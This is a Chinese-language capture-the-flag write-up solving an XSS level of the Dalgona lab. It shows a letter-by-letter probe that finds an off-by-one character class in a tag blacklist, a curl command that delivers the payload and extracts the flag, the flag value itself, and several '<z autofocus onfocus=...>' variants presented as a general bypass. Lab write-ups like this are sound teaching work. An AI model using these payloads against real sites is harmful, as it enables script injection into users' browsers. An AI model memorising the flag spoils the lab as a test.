## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 31 关
（样式表 `static/css/xss/xss31.css`，标题 `Dalgona - Umbrella`）。

入口 `Page` → `GET /page?name=...`，反射在文本节点（只有一个反射点，无表单 POST 分支）：

```html
<input type=text name=name placeholder="Enter your name..."> NAME>
```

### 关键观察

**1. 这关是"拒绝"型过滤，会回显提示。**

```html
<div class='solution-text'>Sorry, you can't use that tag </div>
```

（我一开始漏看了这句，因为它和同族的 `Oops!` 文案格式不同，导致误以为输入被静默丢弃。）

**2. 被拒的不是"危险标签"，而是几乎所有字母开头的标签。**

对每个字母测 `<X`：

| 输入 | 结果 |
| --- | --- |
| `<a` `<b` `<f` `<q` `<y` … | 全部 `Sorry, you can't use that tag` |
| **`<z`** | **通过** |
| **`<Z`** | **通过** |
| `</div>` / `</z>` | 拒绝（`</` 一律拒） |
| `<1` / `< ` / `<<` / `<` | 通过（不是字母） |
| `<!--` / `<!DOCTYPE html>` | 通过 |

也就是说，判定条件等价于：

```python
if re.search(r'<[a-yA-Y]|</', name):   # 拒绝
```

**`a-y` 而不是 `a-z`——这是一个典型的字符类差一（off-by-one）。**
`z`/`Z` 是唯一能作为标签名首字母存活的字母。

**3. 没有其它过滤。**

`alert`、`"XSS"`、空白、引号全部原样保留，所以不需要任何编码技巧。

### 利用链

用一个 `z` 开头的自定义元素，配 `autofocus` + `onfocus`：

```bash
T=$(head -1 .target)
cookie=$(curl -sS --get --data-urlencode 'name=<z autofocus onfocus=alert("XSS")>' \
         "http://$T/page" | grep -o 'flag{[^}]*}')
echo "$cookie"
```

响应：

```html
Congratulations!<p> Here is the flag: flag{5fa1aa53-1445-4ae6-836f-c20854db80ca}
```

实测通过的若干变体：

```text
<z autofocus onfocus=alert("XSS")>
<z onfocus=alert("XSS")>
<zz autofocus onfocus=alert("XSS")>
<z tabindex=0 autofocus onfocus=alert("XSS")>
<z contenteditable autofocus onfocus=alert("XSS")>
<z/autofocus/onfocus=alert("XSS")>
```

未知元素（`<z>`）本身不会被当成 HTML 标准元素，但**它仍然接受属性和焦点事件**，
所以 `onfocus` 能生效——这是本题能成立的关键。

## 复盘

- **黑名单的"差一"是最常见的实现缺陷之一。** `[a-y]`、`[a-zA-Z0-9_]` 少一个字符、
  `['script','svg','img']` 漏掉 `body`…… 系统性枚举（26 个字母各测一次）
  比猜"哪个标签没被拦"快得多，而且能直接发现"只有 z 活着"这种规律。
- **"全部字母被拒"本身就是线索。** 正常黑名单不会拦 `<f`、`<q`、`<y` 这种不存在的标签，
  出现这种结果只有两种可能：字符类范围写错，或者用了"白名单外的都拒"。
  再测 `z` 就能区分——本题是前者。
- **未知元素 + `onfocus` 是绕过"标签名黑名单"的通用套路。** 只要能让浏览器
  创建任意元素，`autofocus` + `onfocus` 就能在不依赖特定标签语义的情况下触发 JS。
  比找"黑名单漏掉的真实标签"更灵活。
- **提示文案要按"族"逐个确认。** 这一关的提示是
  `Sorry, you can't use that tag`（带引号的样式也不同），
  与 004/008 的 `Sorry you can't use: 'token'`、013/016 的静默丢弃都不同。
  我最初按"静默丢弃"处理，白走了一段。
- **`</` 一律被拒，但 `<!--` 可以。** 说明过滤对"闭合标签"单独处理，
  而注释不受限。这条对"能否闭合已有元素"的判断有用（本题用不上，
  因为不需要关标签）。
